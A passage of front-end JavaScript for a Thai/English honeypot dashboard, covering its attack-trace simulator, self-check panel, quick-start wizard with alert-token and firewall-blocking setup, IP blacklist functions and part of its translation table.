        <div class="max-w-3xl"><h2 class="font-bold text-slate-900"><i class="fa-solid fa-bolt text-cyber-cyan"></i> ${esc(tr('sim_title'))}</h2>
          <p class="text-xs text-slate-500 mt-1">${esc(tr('sim_desc'))}</p></div>
        <button class="btn btn-primary" id="sim-full" onclick="runSim('full')" ${simRunning ? 'disabled' : ''}><i class="fa-solid fa-play"></i> ${esc(tr('sc_full'))}</button>
      </div>
      <p class="text-[11px] text-amber-600 bg-amber-50 border border-amber-200 rounded-lg px-3 py-2">${esc(tr('sim_note'))}</p>
      <div class="grid grid-cols-2 md:grid-cols-5 gap-2">${SIM_ORDER.map(k => `
        <button class="sim-card" onclick="runSim('${k}')" ${simRunning ? 'disabled' : ''}>
          <div class="font-semibold text-sm text-slate-900">${esc(tr('sc_' + k))}</div>
          <div class="text-[11px] text-slate-500 mt-1">${esc(tr('sim_' + k + '_d'))}</div></button>`).join('')}</div>
    </div>
    <div class="glass-panel rounded-2xl p-4">
      <div class="flex items-center justify-between mb-2"><h3 class="font-bold text-sm">${esc(tr('sim_term'))}</h3>
        <button class="btn btn-ghost" onclick="document.getElementById('sim-term').innerHTML=''">${esc(tr('sim_clear'))}</button></div>
      <div id="sim-term" class="term font-mono text-xs min-h-[260px] max-h-[420px] overflow-y-auto"></div>
    </div>`;
  const term = document.getElementById('sim-term');
  if (keep) term.innerHTML = keep; else termPrint(term, '$ ' + tr('sim_idle'), 't-dim');
}
async function runSim(kind) {
  if (simRunning) return;
  const r = await call('run_simulation', kind);
  if (!r.ok) return toast(r.error, false);
  simRunning = true; renderSim();
  termPrint(document.getElementById('sim-term'), '', '');
}
function simLine(ev) {
  const term = document.getElementById('sim-term');
  if (ev.done) { simRunning = false; if (term) renderSim(); return; }
  if (!term) return;
  const cls = { ok: 't-ok', warn: 't-warn', err: 't-err' }[ev.level] || (ev.line.startsWith('$') ? 't-cmd' : '');
  termPrint(term, ev.line, cls);
}

// ---------- Help tab ----------
let traceNode = null, traceKind = 'sqli', traceBusy = false, checkItems = null, onlineItems = null;
function renderHelp() {
  const root = document.getElementById('help-root');
  root.innerHTML = `
    <div class="glass-panel rounded-2xl p-5 flex flex-wrap items-center justify-between gap-3">
      <div><h2 class="font-bold text-slate-900"><i class="fa-solid fa-graduation-cap text-cyber-cyan"></i> ${esc(tr('quick_title'))}</h2>
        <p class="text-xs text-slate-500 mt-1">${esc(tr('quick_desc'))}</p></div>
      <button class="btn btn-primary" onclick="openWizard()"><i class="fa-solid fa-wand-magic-sparkles"></i> ${esc(tr('quick_btn'))}</button>
    </div>

    <div class="glass-panel rounded-2xl p-5 space-y-4">
      <div><h2 class="font-bold text-slate-900"><i class="fa-solid fa-diagram-project text-cyber-cyan"></i> ${esc(tr('how_title'))}</h2>
        <p class="text-xs text-slate-500 mt-1 max-w-4xl">${esc(tr('how_desc'))}</p></div>
      <div class="flex flex-wrap gap-2 items-center">
        ${['port_scan', 'ssh_brute', 'sqli', 'traversal', 'log4shell', 'flood'].map(k =>
          `<span class="chip ${k === traceKind ? 'sel' : ''}" onclick="traceKind='${k}'; renderHelp()">${esc(tr('sc_' + k))}</span>`).join('')}
        <button class="btn btn-primary ml-auto" id="trace-btn" onclick="runTrace()" ${traceBusy ? 'disabled' : ''}><i class="fa-solid fa-play"></i> ${esc(tr('simulate'))}</button>
        <button class="btn btn-ghost" onclick="gotoTab('sim')">${esc(tr('real_traffic'))}</button>
      </div>
      <div class="flow">${NODES.map(([id, icon], i) => `
        <div class="flow-node ${traceNode === id ? 'sel' : ''}" id="node-${id}" onclick="showNode('${id}')">
          <span class="absolute -top-2 left-2 text-[9px] font-mono text-slate-500 bg-white px-1">${i + 1}</span>
          <i class="fa-solid ${icon}"></i><div class="font-semibold text-slate-800">${esc(tr('node_' + id))}</div></div>`).join('')}</div>
      <div id="trace-detail" class="term font-mono text-xs min-h-[120px]"><span class="t-dim">${esc(tr('pick_node'))}</span></div>
    </div>

    <div class="glass-panel rounded-2xl p-5 space-y-3">
      <div class="flex flex-wrap items-center justify-between gap-3">
        <div><h2 class="font-bold text-slate-900"><i class="fa-solid fa-clipboard-check text-cyber-cyan"></i> ${esc(tr('check_title'))}</h2>
          <p class="text-xs text-slate-500 mt-1">${esc(tr('check_desc'))}</p></div>
        <div class="flex gap-2"><button class="btn btn-primary" onclick="runCheck()">${esc(tr('run_check'))}</button>
          <button class="btn btn-ghost" onclick="runOnline()">${esc(tr('run_online'))}</button></div>
      </div>
      <div id="check-box" class="term font-mono text-xs"></div>
    </div>`;
  renderCheck();
  if (traceNode) showNode(traceNode);
}
function gotoTab(tab) { document.querySelector(`.tab-btn[data-tab="${tab}"]`).click(); }
function showNode(id) {
  traceNode = id;
  document.querySelectorAll('.flow-node').forEach(n => n.classList.toggle('sel', n.id === 'node-' + id));
  const box = document.getElementById('trace-detail');
  if (box && !traceBusy) box.innerHTML = `<div class="t-cmd mb-1">[${NODES.findIndex(n => n[0] === id) + 1}] ${esc(tr('node_' + id))}</div><div>${esc(tr('info_' + id))}</div>`;
}
function fmtStep(st) {
  const d = st.data, th = LANG === 'th';
  switch (st.id) {
    case 'capture': return th ? `รับการเชื่อมต่อจาก ${d.ip} เข้าพอร์ต ${d.port} (${d.service})${d.enabled ? '' : ' — พอร์ตนี้ปิดอยู่ในการตั้งค่า'}\nข้อมูลที่ได้รับ: ${d.payload}`
                                : `Connection from ${d.ip} to port ${d.port} (${d.service})${d.enabled ? '' : ' - this trap is disabled in config'}\nReceived: ${d.payload}`;
    case 'ratelimit': return d.enabled
      ? (th ? `Token bucket: ${d.rate}/วินาที, burst ${d.burst}. ตรวจ ${d.checked} การเชื่อมต่อ → ผ่าน ${d.passed}, ถูกตัดทิ้ง ${d.dropped}` + (d.dropped ? '\nบันทึกเป็นเหตุการณ์ DoS / Flood 1 รายการ' : '')
             : `Token bucket: ${d.rate}/s, burst ${d.burst}. ${d.checked} connection(s) checked → ${d.passed} passed, ${d.dropped} dropped` + (d.dropped ? '\nLogged as ONE DoS / Flood event' : ''))
      : (th ? 'Rate limiting ปิดอยู่' : 'Rate limiting is disabled');
    case 'classify': return th ? `จำแนกเป็น: ${t(d.type)} | ความรุนแรง ${d.severity}\nThreat Score ${d.score}/100 (${riskLabel(d.risk)}) — ${d.hits} ครั้ง, ${d.ports} พอร์ต`
                               : `Classified as: ${d.type} | severity ${d.severity}\nThreat score ${d.score}/100 (${d.risk}) - ${d.hits} hit(s), ${d.ports} port(s)`;
    case 'geo': return d.cc ? (th ? `${d.ip} → ${d.cc} ${countryName(d.cc)} (${d.db})` : `${d.ip} → ${d.cc} ${countryName(d.cc)} (${d.db})`)
                            : (th ? `ไม่พบข้อมูลประเทศ (${d.db})` : `No country found (${d.db})`);
    case 'db': return th ? `จะบันทึกลง SQLite (ตัวอย่าง ไม่ได้เขียนจริง)\nprev_hash ${d.prev}…\nrow_hash  ${d.hash}…` : `Would be written to SQLite (preview, nothing stored)\nprev_hash ${d.prev}…\nrow_hash  ${d.hash}…`;
    case 'notify': {
      const why = !d.enabled ? (th ? 'การแจ้งเตือนปิดอยู่' : 'alerts are disabled') : !d.channels.length ? (th ? 'ยังไม่ได้ตั้งค่าช่องทาง' : 'no channel configured') : !d.passes ? (th ? `ต่ำกว่าระดับขั้นต่ำ (${d.min})` : `below minimum severity (${d.min})`) : '';
      return (why ? (th ? `จะไม่ส่ง: ${why}\n` : `Would NOT send: ${why}\n`) : (th ? `จะส่งไปที่ ${d.channels.join(', ')}\n` : `Would send via ${d.channels.join(', ')}\n`)) + d.preview;
    }
    case 'defense': {
      if (d.mode === 'off') return th ? 'ระบบป้องกันเชิงรุกปิดอยู่ — เปิดที่แท็บ Defense' : 'Active defense is off - enable it in the Defense tab';
      if (!d.reason) return th ? `ยังไม่เข้าเกณฑ์บล็อก (ต้อง ${d.threshold} ครั้งใน ${d.window} วินาที หรือความรุนแรง HIGH)` : `Block rules not met (needs ${d.threshold} hits in ${d.window}s, or HIGH severity)`;
      const head = th ? `เหตุผล: ${d.reason}\n` : `Reason: ${d.reason}\n`;
      if (d.outcome === 'protected') return head + (th ? `ไม่บล็อก: ${d.protected}` : `Not blocked: ${d.protected}`);
      if (d.outcome === 'dry_run') return head + (th ? 'โหมดจำลอง: บันทึกว่า "จะบล็อก" แต่ไม่แตะไฟร์วอลล์' : 'Dry-run: logged as "would block", firewall untouched');
      return head + (th ? 'จะสั่ง netsh / iptables บล็อก IP นี้' : 'Would run netsh / iptables to block this IP');
    }
  }
  return '';
}
async function runTrace() {
  if (traceBusy) return;
  traceBusy = true; document.getElementById('trace-btn').disabled = true;
  document.querySelectorAll('.flow-node').forEach(n => n.className = 'flow-node');
  const box = document.getElementById('trace-detail');
  box.innerHTML = '';
  const r = await call('trace_attack', traceKind);
  const attacker = document.getElementById('node-attacker');
  attacker.classList.add('on');
  termPrint(box, '$ ' + tr('sc_' + traceKind), 't-cmd');
  await new Promise(r => setTimeout(r, 500));
  attacker.className = 'flow-node ok';
  for (const st of r.steps) {
    const nodeId = STEP_TO_NODE[st.id], node = document.getElementById('node-' + nodeId);
    if (node) node.classList.add('on');
    await new Promise(r => setTimeout(r, 650));
    if (node) node.className = 'flow-node ' + st.status;
    termPrint(box, `[${NODES.findIndex(n => n[0] === nodeId) + 1}] ${tr('node_' + nodeId)}`, st.status === 'warn' ? 't-warn' : st.status === 'skip' ? 't-dim' : 't-ok');
    termPrint(box, fmtStep(st), 't-dim');
  }
  traceBusy = false;
  const b = document.getElementById('trace-btn'); if (b) b.disabled = false;
}

// ---------- checklist ----------
function renderCheck() {
  const box = document.getElementById('check-box');
  if (!box) return;
  if (!checkItems) { box.innerHTML = `<span class="t-dim">${esc(tr('not_run'))}</span>`; return; }
  const items = checkItems.map(it => onlineItems && onlineItems[it.id] ? onlineItems[it.id] : it);
  const HINT = { admin: 'hint_admin', geo: 'hint_geo', ports: 'hint_ports', alerts: 'hint_alerts', telegram: 'hint_alerts', line: 'hint_alerts',
                 pdf: 'hint_pdf', fwtool: 'hint_fw', thaifont: 'hint_font', chain: 'hint_chain', config: 'hint_cfg' };
  box.innerHTML = items.map(it => {
    const mark = it.status === 'ok' ? '<span class="t-ok">[✓]</span>' : it.status === 'warn' ? '<span class="t-warn">[!]</span>' : '<span class="t-err">[✗]</span>';
    const hint = it.status !== 'ok' && HINT[it.id] ? `<div class="t-dim pl-8">↳ ${esc(tr(HINT[it.id]))}</div>` : '';
    return `<div class="term-line">${mark} ${esc(tr('c_' + it.id))}: <span class="${it.status === 'ok' ? 't-ok' : it.status === 'warn' ? 't-warn' : 't-err'}">${esc(it.detail)}</span>${hint}</div>`;
  }).join('');
}
async function runCheck() {
  document.getElementById('check-box').innerHTML = `<span class="t-dim">${esc(tr('checking'))}</span>`;
  onlineItems = null; checkItems = await call('self_check'); renderCheck();
}
async function runOnline() {
  if (!checkItems) checkItems = await call('self_check');
  document.getElementById('check-box').insertAdjacentHTML('afterbegin', `<div class="t-dim term-line">${esc(tr('online_wait'))}</div>`);
  await call('check_online');
}
function onBridgeEvent(raw) {
  const ev = JSON.parse(raw);
  if (ev.kind === 'sim') simLine(ev);
  else if (ev.kind === 'online') {
    if (!ev.items.length) toast(tr('online_none'), false);
    onlineItems = {}; ev.items.forEach(i => onlineItems[i.id] = i); renderCheck();
  }
}

// ---------- Quick Start wizard ----------
let wizOpen = false, wizIdx = 0;
const WIZ = {
  th: [
    { t: 'ยินดีต้อนรับสู่ NetDeceptor', b: () => `<p>NetDeceptor คือ <b>ฮันนีพอต</b>: เปิดพอร์ตปลอมของ FTP / SSH / HTTP / SMB / RDP เพื่อล่อผู้โจมตี ทุกครั้งที่มีคนแตะ ระบบจะ</p>
        <ol class="list-decimal pl-5 space-y-1"><li>จำแนกประเภทการโจมตีและให้คะแนนความเสี่ยง</li><li>บันทึกลง SQLite แบบป้องกันการแก้ไขด้วย hash chain</li><li>แจ้งเตือนเข้า Telegram / LINE</li><li>บล็อก IP ที่ไฟร์วอลล์ (ถ้าเปิดใช้)</li></ol>
        <p class="text-slate-500">วิซาร์ดนี้ใช้เวลาไม่ถึง 3 นาที เปิดดูซ้ำได้ที่แท็บ Help</p>` },
    { t: 'ตั้งค่าพอร์ตกับดัก', b: () => `<p>ไปที่แท็บ ${kbd('Trap Config')} เพื่อเปิด-ปิดพอร์ต แก้ชื่อบริการ และแก้ <b>banner</b> ที่ส่งให้ผู้บุกรุก — มีผลทันทีโดยไม่ต้องรีสตาร์ต</p>
        <ul class="list-disc pl-5 space-y-1"><li>พอร์ตต่ำกว่า 1024 (21, 22, 80, 445) ต้องใช้สิทธิ์ผู้ดูแลระบบ หรืออาจถูกบริการจริงใช้อยู่แล้ว — สถานะจะขึ้น "ผิดพลาด"</li>
        <li><b>Bind address</b> ค่าเริ่มต้น ${kbd('127.0.0.1')} รับเฉพาะเครื่องนี้ ถ้าจะดักผู้โจมตีจริงจากเครือข่าย ให้เปลี่ยนเป็น ${kbd('0.0.0.0')}</li>
        <li>ถ้าเป็นเซิร์ฟเวอร์จริงที่มี SSH ใช้งานอยู่ อย่าเปิดกับดักทับพอร์ตเดียวกัน</li></ul>`, go: ['traps', 'open_traps'] },
    { t: 'สร้างโทเคนแจ้งเตือน', b: () => `<p><b>LINE</b> — LINE Notify ปิดให้บริการแล้ว (มี.ค. 2025) ใช้ <b>Messaging API</b> แทน:</p>
        <ol class="list-decimal pl-5 space-y-1"><li>เข้า ${kbd('developers.line.biz/console')} → สร้าง Provider → สร้างช่อง <b>Messaging API</b></li>
        <li>แท็บ Messaging API → <b>Channel access token (long-lived)</b> → Issue → คัดลอก</li>
        <li>แท็บ Basic settings → คัดลอก <b>Your user ID</b> (ขึ้นต้นด้วย U)</li>
        <li>สแกน QR เพิ่มบอทเป็นเพื่อนก่อน ไม่งั้นส่ง push ไม่ได้</li></ol>
        <p><b>Telegram</b></p>
        <ol class="list-decimal pl-5 space-y-1"><li>คุยกับ ${kbd('@BotFather')} → ${kbd('/newbot')} → คัดลอก token</li>
        <li>ส่งข้อความหาบอทหนึ่งครั้ง แล้วเปิด ${kbd('https://api.telegram.org/bot&lt;TOKEN&gt;/getUpdates')} หา <b>chat.id</b></li></ol>
        <p class="text-slate-500">วางลงแท็บ Alerts แล้วกด "ส่งข้อความทดสอบ"</p>`, go: ['alerts', 'open_alerts'] },
    { t: 'ตั้งค่าไฟร์วอลล์ (Active Defense)', b: () => `<p>ที่แท็บ ${kbd('Defense')} ระบบจะบล็อก IP ที่โจมตีเกิน N ครั้ง หรือความรุนแรง HIGH</p>
        <ul class="list-disc pl-5 space-y-1"><li><b>โหมดจำลอง (Dry-run) เปิดอยู่เป็นค่าเริ่มต้น</b> — บันทึกว่า "จะบล็อก" แต่ไม่แตะไฟร์วอลล์ ลองก่อนแล้วค่อยปิด</li>
        <li><b>Windows:</b> คลิกขวาโปรแกรม → Run as administrator คำสั่งที่ใช้:</li></ul>
        <div class="codeblock">netsh advfirewall firewall add rule name=NetDeceptor_Block_&lt;IP&gt; dir=in action=block remoteip=&lt;IP&gt;</div>
        <ul class="list-disc pl-5 space-y-1"><li><b>Linux:</b> ${kbd('sudo python3 netdeceptor.py')} ใช้ ${kbd('iptables -I INPUT -s &lt;IP&gt; -j DROP')}</li>
        <li>ไม่บล็อก loopback, เครื่องตัวเอง และ LAN (ปิดได้) ใส่ IP ที่ต้องยกเว้นใน Allowlist ได้ และปลดบล็อก/ยกเว้นทีหลังจากตาราง Blocked IPs</li></ul>`, go: ['defense', 'open_defense'] },
    { t: 'พร้อมแล้ว — ลองเลย', b: () => `<p>ขั้นสุดท้าย:</p>
        <ol class="list-decimal pl-5 space-y-1"><li>แท็บ <b>Help</b> → "ตรวจสอบระบบ" เพื่อดูว่าพร้อมครบหรือยัง</li>
        <li>แท็บ <b>Simulator</b> → "รันเดโมเต็มรูปแบบ" แล้วดูผลที่ Dashboard</li>
        <li>แท็บ <b>Reports</b> → ส่งออก PDF / CSV / JSON และกด "ตรวจสอบตอนนี้" เพื่อพิสูจน์ว่า log ไม่ถูกแก้ไข</li></ol>`, go: ['help', 'open_help'] },
  ],
  en: [
    { t: 'Welcome to NetDeceptor', b: () => `<p>NetDeceptor is a <b>honeypot</b>: it opens fake FTP / SSH / HTTP / SMB / RDP ports to lure attackers. Every time one is touched it will</p>
        <ol class="list-decimal pl-5 space-y-1"><li>classify the attack and score its risk</li><li>store it in SQLite with a tamper-evident hash chain</li><li>alert you on Telegram / LINE</li><li>block the IP at the firewall (if enabled)</li></ol>
        <p class="text-slate-500">This takes under 3 minutes. You can reopen it any time from the Help tab.</p>` },
    { t: 'Set up the trap ports', b: () => `<p>Open the ${kbd('Trap Config')} tab to toggle ports, rename services and edit the <b>banner</b> sent to intruders - changes apply instantly, no restart.</p>
        <ul class="list-disc pl-5 space-y-1"><li>Ports below 1024 (21, 22, 80, 445) need administrator rights or may already be used by a real service - the status will say "error".</li>
        <li><b>Bind address</b> defaults to ${kbd('127.0.0.1')} (this machine only). To catch real attackers from the network switch to ${kbd('0.0.0.0')}.</li>
        <li>On a real server where SSH is in use, don't put a trap on the same port.</li></ul>`, go: ['traps', 'open_traps'] },
    { t: 'Create alert tokens', b: () => `<p><b>LINE</b> - LINE Notify was shut down (Mar 2025); use the <b>Messaging API</b>:</p>
        <ol class="list-decimal pl-5 space-y-1"><li>Go to ${kbd('developers.line.biz/console')} → create a Provider → create a <b>Messaging API</b> channel</li>
        <li>Messaging API tab → <b>Channel access token (long-lived)</b> → Issue → copy</li>
        <li>Basic settings tab → copy <b>Your user ID</b> (starts with U)</li>
        <li>Scan the QR code to add the bot as a friend first, otherwise push messages fail</li></ol>
        <p><b>Telegram</b></p>
        <ol class="list-decimal pl-5 space-y-1"><li>Chat with ${kbd('@BotFather')} → ${kbd('/newbot')} → copy the token</li>
        <li>Message your bot once, then open ${kbd('https://api.telegram.org/bot&lt;TOKEN&gt;/getUpdates')} and read <b>chat.id</b></li></ol>
        <p class="text-slate-500">Paste them into the Alerts tab and press "Send test".</p>`, go: ['alerts', 'open_alerts'] },
    { t: 'Firewall setup (Active Defense)', b: () => `<p>In the ${kbd('Defense')} tab, IPs are blocked after N attacks or on HIGH severity.</p>
        <ul class="list-disc pl-5 space-y-1"><li><b>Dry-run is ON by default</b> - it logs "would block" without touching the firewall. Try it first, then switch it off.</li>
        <li><b>Windows:</b> right-click the program → Run as administrator. Command used:</li></ul>
        <div class="codeblock">netsh advfirewall firewall add rule name=NetDeceptor_Block_&lt;IP&gt; dir=in action=block remoteip=&lt;IP&gt;</div>
        <ul class="list-disc pl-5 space-y-1"><li><b>Linux:</b> ${kbd('sudo python3 netdeceptor.py')} uses ${kbd('iptables -I INPUT -s &lt;IP&gt; -j DROP')}</li>
        <li>Loopback, this machine and LAN addresses are never blocked (configurable). Add exceptions to the Allowlist, and unblock / whitelist later from the Blocked IPs table.</li></ul>`, go: ['defense', 'open_defense'] },
    { t: "You're ready - try it", b: () => `<p>Last steps:</p>
        <ol class="list-decimal pl-5 space-y-1"><li><b>Help</b> tab → "Run self-check" to confirm everything is in place</li>
        <li><b>Simulator</b> tab → "Run full demo", then watch the Dashboard</li>
        <li><b>Reports</b> tab → export PDF / CSV / JSON and press "Verify now" to prove the log was not tampered with</li></ol>`, go: ['help', 'open_help'] },
  ],
};
function openWizard() { wizIdx = 0; wizOpen = true; document.getElementById('wiz').classList.remove('hidden'); renderWizard(); }
function wizClose() {
  wizOpen = false; document.getElementById('wiz').classList.add('hidden');
  if (bridge && state && !state.config.onboarded) { state.config.onboarded = true; call('set_onboarded', '1'); }
}
function renderWizard() {
  const steps = WIZ[LANG], st = steps[wizIdx];
  document.getElementById('wiz-step').textContent = `${tr('wiz_step')} ${wizIdx + 1}/${steps.length}`;
  document.getElementById('wiz-title').textContent = st.t;
  document.getElementById('wiz-body').innerHTML = st.b() + (st.go ? `<div class="pt-2"><button class="btn btn-ghost" onclick="wizGo('${st.go[0]}')">${esc(tr(st.go[1]))} →</button></div>` : '');
  document.getElementById('wiz-dots').innerHTML = steps.map((_, i) => `<span class="w-2 h-2 rounded-full ${i === wizIdx ? 'bg-cyber-blue' : 'bg-slate-200'}" ></span>`).join('');
  document.getElementById('wiz-back').textContent = tr('wiz_back');
  document.getElementById('wiz-back').style.visibility = wizIdx ? 'visible' : 'hidden';
  document.getElementById('wiz-next').textContent = wizIdx === steps.length - 1 ? tr('wiz_done') : tr('wiz_next');
}
function wizNext() { if (wizIdx >= WIZ[LANG].length - 1) return wizClose(); wizIdx++; renderWizard(); }
function wizBack() { if (wizIdx) { wizIdx--; renderWizard(); } }
function wizGo(tab) { wizClose(); gotoTab(tab); }

// ---------- blacklist management ----------
async function manualBlock() {
  const ip = document.getElementById('m-ip').value.trim();
  if (!ip) return;
  const r = await call('block_ip_manual', ip);
  if (!r.ok) toast(`${r.event.status}: ${r.event.detail}`, false);
  loadDefense();
}
async function whitelist(ip) {
  ip = (ip || '').trim(); if (!ip) return;
  const r = await call('whitelist_ip', ip);
  toast(r.ok ? (LANG === 'th' ? `ยกเว้น ${ip} แล้ว (และปลดบล็อกถ้าเคยถูกบล็อก)` : `Whitelisted ${ip} (and unblocked if it was blocked)`) : r.error, r.ok);
  loadDefense();
}
async function removeWhitelist(entry) { await call('remove_whitelist', entry); loadDefense(); }

// ---------- i18n (Thai / English) ----------
let LANG = 'th';
const TH = {
  'Python AsyncIO Honeypot & Threat Inspector': 'ฮันนีพอตแบบ AsyncIO และระบบตรวจจับภัยคุกคาม',
  'Dashboard': 'แดชบอร์ด', 'Trap Config': 'ตั้งค่ากับดัก', 'Alerts': 'การแจ้งเตือน', 'Reports': 'รายงาน',
  'Live Engine Active': 'ระบบกำลังทำงาน',
  'ACTIVE TRAPS': 'กับดักที่เปิดอยู่', '0 Ports': '0 พอร์ต',
  'INTERCEPTED ATTACKS (ALL TIME)': 'การโจมตีที่ดักได้ (ทั้งหมด)',
  'TOP TARGET PORT': 'พอร์ตที่ถูกโจมตีมากที่สุด', 'LAST INTRUDER IP': 'IP ผู้บุกรุกล่าสุด', 'None': 'ไม่มี',
  'Network Mesh Node Visualizer': 'แผนภาพเครือข่ายผู้โจมตี',
  'Real-time Attack Telemetry Feed': 'ฟีดการโจมตีแบบเรียลไทม์',
  '(persisted to SQLite)': '(บันทึกลง SQLite)',
  'Listening for real-time network probes...': 'กำลังเฝ้าฟังการสแกนเครือข่ายแบบเรียลไทม์...',
  'Dynamic Trap Configuration': 'ตั้งค่ากับดักแบบไดนามิก',
  'Toggle ports and edit banners. Changes apply instantly - no restart needed.': 'เปิด-ปิดพอร์ตและแก้ไขแบนเนอร์ได้ การเปลี่ยนแปลงมีผลทันที ไม่ต้องรีสตาร์ตโปรแกรม',
  'Bind address': 'ที่อยู่ที่รับการเชื่อมต่อ',
  '127.0.0.1 (local only)': '127.0.0.1 (เฉพาะเครื่องนี้)', '0.0.0.0 (all interfaces)': '0.0.0.0 (ทุกอินเทอร์เฟซ)',
  'Ports below 1024 (21, 22, 80, 445...) may need administrator/root rights, or may already be used by real services. Status shows "error" in that case.':
    'พอร์ตที่ต่ำกว่า 1024 (21, 22, 80, 445...) อาจต้องใช้สิทธิ์ผู้ดูแลระบบ/root หรือถูกบริการจริงใช้งานอยู่แล้ว กรณีนี้สถานะจะแสดงเป็น "ผิดพลาด"',
  'Add trap': 'เพิ่มกับดัก', 'Save & apply': 'บันทึกและใช้งาน',
  'ON': 'เปิด', 'PORT': 'พอร์ต', 'SERVICE NAME': 'ชื่อบริการ', 'SEVERITY': 'ความรุนแรง',
  'BANNER (sent to the intruder on connect)': 'แบนเนอร์ (ส่งให้ผู้บุกรุกเมื่อเชื่อมต่อ)',
  'Port': 'พอร์ต', 'listening': 'กำลังรับ', 'off': 'ปิด', 'error': 'ผิดพลาด',
  'Real-time Alert Notifications': 'การแจ้งเตือนภัยคุกคามแบบเรียลไทม์',
  'Send a message to your phone the moment a trap is hit. Tokens are stored locally in netdeceptor_config.json.':
    'ส่งข้อความเข้ามือถือทันทีที่มีคนแตะกับดัก โทเคนถูกเก็บไว้ในเครื่องที่ไฟล์ netdeceptor_config.json',
  'Enable alerts': 'เปิดใช้การแจ้งเตือน', 'Minimum severity': 'ระดับความรุนแรงขั้นต่ำ',
  'HIGH only': 'เฉพาะ HIGH', 'MEDIUM and above (everything)': 'MEDIUM ขึ้นไป (ทั้งหมด)',
  'Cooldown per IP (seconds)': 'เว้นระยะแจ้งเตือนต่อ IP (วินาที)',
  'Bot token (from @BotFather)': 'Bot token (จาก @BotFather)',
  "LINE Notify was shut down in March 2025, so this uses a LINE Official Account's Messaging API push message instead.":
    'LINE Notify ปิดให้บริการแล้วตั้งแต่เดือนมีนาคม 2025 จึงใช้ Push Message ผ่าน Messaging API ของ LINE Official Account แทน',
  'Your user ID (U...)': 'User ID ของคุณ (U...)',
  'Save': 'บันทึก', 'Send test': 'ส่งข้อความทดสอบ', 'Sending...': 'กำลังส่ง...',
  'Alert settings saved': 'บันทึกการตั้งค่าแจ้งเตือนแล้ว', 'Trap config applied': 'ใช้การตั้งค่ากับดักแล้ว',
  'Security Audit Report': 'รายงานตรวจสอบความปลอดภัย',
  'Statistics are read straight from the SQLite database.': 'สถิติอ่านตรงจากฐานข้อมูล SQLite',
  'Period': 'ช่วงเวลา',
  'Last 24 hours': '24 ชั่วโมงล่าสุด', 'Last 7 days': '7 วันล่าสุด', 'Last 30 days': '30 วันล่าสุด', 'All time': 'ทั้งหมด',
  'Export CSV': 'ส่งออก CSV', 'Export PDF': 'ส่งออก PDF',
  'TOTAL': 'ทั้งหมด', 'UNIQUE IPs': 'IP ที่ไม่ซ้ำ', 'HIGH SEVERITY': 'ความรุนแรงสูง',
  'Attacks by hour of day': 'การโจมตีแยกตามชั่วโมงของวัน', 'Top attacker IPs': 'IP ผู้โจมตีสูงสุด',
  'No data yet': 'ยังไม่มีข้อมูล',
  'Defense': 'ป้องกัน',
  'Top Attack Types': 'ประเภทการโจมตีสูงสุด', 'Top Countries': 'ประเทศต้นทางสูงสุด',
  'SQL Injection': 'SQL Injection', 'Directory Traversal': 'Directory Traversal', 'Log4Shell': 'Log4Shell',
  'Command Injection': 'Command Injection', 'XSS': 'XSS', 'Scanner Tool': 'เครื่องมือสแกน',
  'Credential Attempt': 'พยายามล็อกอิน', 'Web Recon': 'สำรวจเว็บ', 'Port Scan': 'สแกนพอร์ต',
  'Brute-force': 'เดารหัสผ่าน', 'Probe': 'สำรวจทั่วไป', 'DoS / Flood': 'ถล่มระบบ (DoS)', 'Unclassified': 'ไม่ระบุประเภท',
  'blocked': 'ถูกบล็อก', 'dry_run': 'จำลอง (ไม่ได้บล็อกจริง)', 'failed': 'ล้มเหลว',
  'protected': 'ป้องกันไว้ (ไม่บล็อก)', 'unblocked': 'ปลดบล็อกแล้ว', 'Unblock': 'ปลดบล็อก',
  'Active Defense & Firewall': 'ระบบป้องกันเชิงรุกและไฟร์วอลล์',
  'Automatically block repeat attackers at the OS firewall.': 'บล็อกผู้โจมตีซ้ำที่ไฟร์วอลล์ของระบบปฏิบัติการโดยอัตโนมัติ',
  "Dry-run is ON by default: blocks are only logged and no firewall rule is created. Loopback, link-local and this machine's own addresses are never blocked. Windows needs the program started as administrator.":
    'โหมดจำลอง (Dry-run) เปิดอยู่เป็นค่าเริ่มต้น: การบล็อกจะถูกบันทึกเท่านั้น ไม่มีการสร้างกฎไฟร์วอลล์จริง ที่อยู่ loopback, link-local และที่อยู่ของเครื่องนี้จะไม่ถูกบล็อกเด็ดขาด บน Windows ต้องเปิดโปรแกรมด้วยสิทธิ์ผู้ดูแลระบบ (Run as administrator)',
  'Enable active defense': 'เปิดใช้ระบบป้องกันเชิงรุก',
  'Dry-run (log only, do not touch the firewall)': 'โหมดจำลอง (บันทึกเท่านั้น ไม่แตะไฟร์วอลล์)',
  'Never block private / LAN addresses': 'ไม่บล็อกที่อยู่ภายใน / LAN',
  'Block immediately on HIGH severity': 'บล็อกทันทีเมื่อความรุนแรงระดับ HIGH',
  'Block immediately on DoS / flood': 'บล็อกทันทีเมื่อถูกถล่ม (DoS / flood)',
  'Block after N attacks': 'บล็อกเมื่อโจมตีเกิน N ครั้ง',
  'Counting window (seconds)': 'ช่วงเวลานับ (วินาที)',
  'Auto-unblock after (minutes, 0 = never)': 'ปลดบล็อกอัตโนมัติหลัง (นาที, 0 = ไม่ปลด)',
  'Allowlist (one IP or CIDR per line)': 'รายการที่ยกเว้น (IP หรือ CIDR บรรทัดละหนึ่งรายการ)',
  'Rate Limiting & Resource Protection': 'จำกัดอัตราและป้องกันทรัพยากร',
  'Token bucket per source IP plus global caps keep the engine and the dashboard smooth during a flood.':
    'ใช้ Token Bucket แยกตาม IP ต้นทาง ร่วมกับเพดานรวมของระบบ เพื่อให้เอนจินและแดชบอร์ดลื่นไหลแม้ถูกถล่ม',
  'Enable rate limiting': 'เปิดใช้การจำกัดอัตรา',
  'Connections per second per IP': 'การเชื่อมต่อต่อวินาทีต่อ IP',
  'Burst size per IP': 'ขนาด burst ต่อ IP',
  'Max concurrent connections': 'การเชื่อมต่อพร้อมกันสูงสุด',
  'Max UI events per second': 'จำนวนเหตุการณ์สูงสุดที่ส่งขึ้น UI ต่อวินาที',
  'IP Geolocation (offline GeoLite2)': 'ระบุตำแหน่ง IP (GeoLite2 แบบออฟไลน์)',
  'Place GeoLite2-City.mmdb (or GeoLite2-Country.mmdb) next to the program and run: pip install geoip2. Without it, only private/LAN addresses are labelled.':
    'วางไฟล์ GeoLite2-City.mmdb (หรือ GeoLite2-Country.mmdb) ไว้ข้างโปรแกรม แล้วรัน: pip install geoip2 หากไม่มีจะระบุได้เฉพาะที่อยู่ภายใน/LAN',
